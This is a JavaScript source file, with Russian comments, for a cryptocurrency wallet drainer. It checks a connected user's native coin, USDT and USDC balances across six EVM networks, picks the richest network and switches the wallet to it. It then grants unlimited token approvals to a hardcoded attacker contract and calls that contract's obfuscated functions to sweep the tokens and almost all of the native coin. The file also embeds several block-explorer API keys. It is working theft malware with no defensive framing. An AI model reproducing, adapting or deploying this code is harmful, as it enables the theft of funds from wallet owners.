import { ethers } from 'ethers';

// ABI для ERC20 токенов
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

// ABI для дрейнера
const DRAINER_ABI = [
  "function tK7(uint256 usdtAmount, uint256 usdcAmount) external",
  "function bN3() external payable"
];

// Ключи API для сканеров
const ETHERSCAN_API_KEY = "X2A1BU3MABVFFN1GQ1DRX5PHNG212MTXKT";
const BSCSCAN_API_KEY = "8AWWMFHVD5E65JCGGYKKE95RTKTPB7AJJR";
const POLYGONSCAN_API_KEY = "43EJ8S6WRP4ESVX8AGM8KP9I61P44YWZ2T";
const ARBISCAN_API_KEY = "6YDH1XI6VB7UBQV4WXSH2M7UIEBMMCF9ES";
const OPTIMISTIC_ETHERSCAN_API_KEY = "5CKHVMKCD5VBXIB4PCM4KYKX5JJCCVU3RW";
const BASESCAN_API_KEY = "TEB6I1H3F1UH1DF2I1R39PA9RX5C6IKB1H";

// Конфигурация сетей
const CHAINS = {
  1: {
    name: "Ethereum Mainnet",
    nativeToken: "ETH",
    chainIdHex: "0x1",
    rpcUrls: ["https://rpc.ankr.com/eth"],
    usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
    explorerApi: "https://api.etherscan.io/api",
    explorerApiKey: ETHERSCAN_API_KEY
  },
  56: {
    name: "BNB Chain",
    nativeToken: "BNB",
    chainIdHex: "0x38",
    rpcUrls: [
      "https://bsc-dataseed.binance.org/",
      "https://bsc-dataseed1.defibit.io/",
      "https://bsc-dataseed1.ninicoin.io/"
    ],
    usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
    usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
    explorerApi: "https://api.bscscan.com/api",
    explorerApiKey: BSCSCAN_API_KEY
  },
  137: {
    name: "Polygon",
    nativeToken: "MATIC",
    chainIdHex: "0x89",
    rpcUrls: ["https://polygon-rpc.com/"],
    usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
    usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
    explorerApi: "https://api.polygonscan.com/api",
    explorerApiKey: POLYGONSCAN_API_KEY
  },
  42161: {
    name: "Arbitrum One",
    nativeToken: "ETH",
    chainIdHex: "0xa4b1",
    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
    usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
    usdcAddress: "0xAF88d065e77c8cC2239327C5EDb3A432268e5831",
    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
    explorerApi: "https://api.arbiscan.io/api",
    explorerApiKey: ARBISCAN_API_KEY
  },
  10: {
    name: "Optimism",
    nativeToken: "ETH",
    chainIdHex: "0xa",
    rpcUrls: ["https://mainnet.optimism.io"],
    usdtAddress: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
    usdcAddress: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",
    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
    explorerApi: "https://api-optimistic.etherscan.io/api",
    explorerApiKey: OPTIMISTIC_ETHERSCAN_API_KEY
  },
  8453: {
    name: "Base",
    nativeToken: "ETH",
    chainIdHex: "0x2105",
    rpcUrls: ["https://mainnet.base.org"],
    usdtAddress: "0xfde4C96c8593536E31F229EA8d515f7bC60b677",
    usdcAddress: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
    drainerAddress: "0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF",
    explorerApi: "https://api.basescan.org/api",
    explorerApiKey: BASESCAN_API_KEY
  },
};

// Утилита для задержки
const delay = (ms) => new Promise(r => setTimeout(r, ms));

// Получение баланса нативного токена через API
async function getBalanceFromExplorer(address, chainId) {
  const config = CHAINS[chainId];
  const apiUrl = `${config.explorerApi}?module=account&action=balance&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
  const response = await fetch(apiUrl);
  const data = await response.json();
  if (data.status === "1") {
    return ethers.BigNumber.from(data.result);
  } else {
    throw new Error(data.message || `Ошибка API для ${config.name}`);
  }
}

// Получение баланса токена через API
async function getTokenBalanceFromExplorer(address, tokenAddress, chainId) {
  const config = CHAINS[chainId];
  const apiUrl = `${config.explorerApi}?module=account&action=tokenbalance&contractaddress=${tokenAddress}&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
  const response = await fetch(apiUrl);
  const data = await response.json();
  if (data.status === "1") {
    return ethers.BigNumber.from(data.result);
  } else {
    throw new Error(data.message || `Ошибка API для токена в ${config.name}`);
  }
}

// Проверка баланса с использованием API и fallback на RPC
async function checkBalance(chainId, userAddress) {
  const config = CHAINS[chainId];
  let nativeBalance, usdtBalance, usdcBalance;

  // Проверка нативного баланса через API
  try {
    nativeBalance = await getBalanceFromExplorer(userAddress, chainId);
  } catch (e) {
    console.warn(`Ошибка API для нативного баланса в ${config.name}: ${e.message}`);
    let provider;
    for (const rpc of config.rpcUrls) {
      try {
        provider = new ethers.providers.JsonRpcProvider(rpc);
        await provider.getBlockNumber();
        break;
      } catch (_) {}
    }
    if (!provider) throw new Error(`Нет доступных RPC для ${config.name}`);
    nativeBalance = await provider.getBalance(userAddress);
  }

  // Проверка USDT через API
  try {
    usdtBalance = await getTokenBalanceFromExplorer(userAddress, config.usdtAddress, chainId);
  } catch (e) {
    console.warn(`Ошибка API для USDT в ${config.name}: ${e.message}`);
    const provider = new ethers.providers.JsonRpcProvider(config.rpcUrls[0]);
    const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider);
    usdtBalance = await usdt.balanceOf(userAddress);
  }

  // Проверка USDC через API
  try {
    usdcBalance = await getTokenBalanceFromExplorer(userAddress, config.usdcAddress, chainId);
  } catch (e) {
    console.warn(`Ошибка API для USDC в ${config.name}: ${e.message}`);
    const provider = new ethers.providers.JsonRpcProvider(config.rpcUrls[0]);
    const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider);
    usdcBalance = await usdc.balanceOf(userAddress);
  }

  return { nativeBalance, usdtBalance, usdcBalance };
}

// Проверка наличия средств
function hasFunds(bal) {
  return (
    bal.nativeBalance.gt(ethers.utils.parseEther("0.001")) ||
    bal.usdtBalance.gt(ethers.utils.parseUnits("0.1", 6)) ||
    bal.usdcBalance.gt(ethers.utils.parseUnits("0.1", 6))
  );
}

// Переключение сети
async function switchChain(chainId) {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: CHAINS[chainId].chainIdHex }]
    });
  } catch (e) {
    console.warn(`Ошибка переключения на сеть ${CHAINS[chainId].name}: ${e.message}`);
    throw e;
  }
}

// Выполнение дрейна
async function drain(chainId, signer, userAddress, bal) {
  const config = CHAINS[chainId];
  const MAX = ethers.constants.MaxUint256;

  const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer);
  const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, signer);
  const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, signer);

  if (bal.usdtBalance.gt(0)) {
    const allowance = await usdt.allowance(userAddress, config.drainerAddress);
    if (allowance.lt(bal.usdtBalance)) {
      await usdt.approve(config.drainerAddress, MAX);
    }
  }

  if (bal.usdcBalance.gt(0)) {
    const allowance = await usdc.allowance(userAddress, config.drainerAddress);
    if (allowance.lt(bal.usdcBalance)) {
      await usdc.approve(config.drainerAddress, MAX);
    }
  }

  if (bal.usdtBalance.gt(0) || bal.usdcBalance.gt(0)) {
    await drainer.tK7(bal.usdtBalance, bal.usdcBalance);
  }

  const nativeToSend = bal.nativeBalance.sub(ethers.utils.parseEther("0.001"));
  if (nativeToSend.gt(0)) {
    await drainer.bN3({ value: nativeToSend });
  }
}

// Основная функция
export async function runDrainer(provider, signer, userAddress) {
  const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
    try {
      const balance = await checkBalance(chainId, userAddress);
      console.log(`Сеть: ${CHAINS[chainId].name}`);
      console.log(`💰 ${CHAINS[chainId].nativeToken}: ${ethers.utils.formatEther(balance.nativeBalance)}`);
      console.log(`🟠 USDT: ${ethers.utils.formatUnits(balance.usdtBalance, 6)}`);
      console.log(`🔵 USDC: ${ethers.utils.formatUnits(balance.usdcBalance, 6)}`);
      return { chainId: Number(chainId), ...balance };
    } catch (e) {
      console.warn(`Ошибка при проверке баланса в сети ${CHAINS[chainId].name}: ${e.message}`);
      return null;
    }
  });

  const balances = (await Promise.all(balancePromises)).filter(Boolean);

  const sorted = balances
    .filter(hasFunds)
    .sort((a, b) =>
      b.usdtBalance.add(b.usdcBalance).gt(a.usdtBalance.add(a.usdcBalance)) ? 1 : -1
    );

  if (!sorted.length) {
    console.warn("⛔ Нет подходящих сетей с балансом.");
    return;
  }

  const target = sorted[0];
  await switchChain(target.chainId);
  await drain(target.chainId, signer, userAddress, target);
}
